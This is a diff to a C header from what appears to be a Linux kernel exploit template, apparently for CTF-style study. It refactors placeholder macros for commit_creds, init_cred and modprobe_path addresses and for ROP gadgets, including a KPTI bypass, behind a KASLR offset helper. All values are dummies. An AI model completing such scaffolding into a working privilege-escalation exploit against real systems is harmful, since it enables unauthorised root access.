@@ -25,6 +25,8 @@
 extern u64 user_cs, user_ss, user_sp, user_flags;
 extern u64 kbase;
 extern u64 kheap;
+#define ADDR_NOKASLR(addr) ((u64)addr + kbase_offset)
+#define ADDR_OFFSET(offset) (kbase + offset)
 
 /* -------------------- editable -------------------- */
 #define CONFIG_PHYSICAL_START (0x1000000ull)
@@ -36,13 +38,13 @@ extern u64 kheap;
 #define PAGE_OFFSET_BASE_UPPER_BOUND (0xfffffe0000000000ull)
 
 // addresses
-#define addr_init_cred (DUMMY_VALUE + kbase_offset)
-#define addr_commit_creds (DUMMY_VALUE + kbase_offset)
-#define addr_modprobe_path (DUMMY_VALUE + kbase_offset)
+#define addr_init_cred ADDR_NOKASLR(DUMMY_VALUE)
+#define addr_commit_creds ADDR_NOKASLR(DUMMY_VALUE)
+#define addr_modprobe_path ADDR_NOKASLR(DUMMY_VALUE)
 
 // gadgets
-#define pop_rdi_ret (DUMMY_VALUE + kbase_offset)
-#define bypass_kpti (DUMMY_VALUE + kbase_offset)
+#define pop_rdi_ret ADDR_NOKASLR(DUMMY_VALUE)
+#define bypass_kpti ADDR_NOKASLR(DUMMY_VALUE)
 
 // global variable initial values
 #define INIT_KBASE (default_kbase)
